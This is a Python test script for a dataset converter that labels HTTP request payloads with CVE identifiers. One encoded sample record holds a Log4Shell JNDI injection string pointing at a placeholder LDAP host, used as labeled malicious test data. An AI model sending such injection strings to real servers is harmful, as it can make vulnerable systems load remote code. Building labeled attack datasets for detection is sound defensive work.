from __future__ import annotations

import gzip
import json
import subprocess
import sys
import tempfile
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parents[1]


def main() -> None:
    with tempfile.TemporaryDirectory() as temp_dir:
        temp = Path(temp_dir)
        input_path = temp / "mini.json.gz"
        output_path = temp / "mini.csv"
        records = [
            {
                "id": "1",
                "payload": _encode_payload("GET /?x=${jndi:ldap://a/b} HTTP/1.1\r\nHost: victim\r\n\r\n"),
                "labeled": "1",
                "cve_labels": "CVE-2021-44228",
            },
            {
                "id": "2",
                "payload": _encode_payload("GET / HTTP/1.1\r\nHost: benign\r\n\r\n"),
                "labeled": "0",
                "cve_labels": "",
            },
        ]
        with gzip.open(input_path, "wt", encoding="utf-8") as handle:
            for record in records:
                handle.write(json.dumps(record) + "\n")

        subprocess.run(
            [
                sys.executable,
                "scripts/convert_datacon_dataset.py",
                "--input",
                str(input_path),
                "--output",
                str(output_path),
            ],
            cwd=PROJECT_ROOT,
            check=True,
        )
        text = output_path.read_text(encoding="utf-8")
        assert "payload_clean" in text
        assert "CVE-2021-44228" in text
        assert "benign" not in text


def _encode_payload(text: str) -> str:
    import base64
    import zlib

    return base64.b64encode(zlib.compress(text.encode("utf-8"))).decode("ascii")


if __name__ == "__main__":
    main()

